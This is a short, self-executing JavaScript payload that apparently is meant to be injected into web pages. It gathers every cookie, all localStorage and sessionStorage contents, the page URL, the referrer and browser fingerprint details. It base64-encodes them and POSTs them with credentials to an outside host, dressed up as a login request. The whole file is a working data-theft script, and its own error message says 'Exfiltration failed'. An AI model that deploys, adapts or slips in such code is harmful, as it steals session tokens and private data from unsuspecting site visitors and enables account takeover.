(function () {
  if (!localStorage.getItem("session_id")) {
    localStorage.setItem("session_id", "abc123xyz");
  }

  if (!sessionStorage.getItem("temp_key")) {
    sessionStorage.setItem("temp_key", "42");
  }

  if (!document.cookie.includes("user_id")) {
    document.cookie = "user_id=42; path=/";
  }

  const payload = {
    cookies: document.cookie || '[empty]',
    localStorage: {},
    sessionStorage: {},
    location: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    screen: {
      width: screen.width,
      height: screen.height,
      pixelDepth: screen.pixelDepth
    },
    language: navigator.language,
    platform: navigator.platform,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    date: new Date().toISOString()
  };

  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    payload.localStorage[key] = localStorage.getItem(key);
  }

  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    payload.sessionStorage[key] = sessionStorage.getItem(key);
  }

  const jsonString = JSON.stringify(payload, null, 2);
  const base64Payload = btoa(unescape(encodeURIComponent(jsonString)));

  fetch('https://zaza-back.onrender.com/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({
      email: 'capture.js',
      password: 'autopayload',
      cookies: base64Payload
    })
  }).catch(err => console.error('Exfiltration failed:', err));
})();
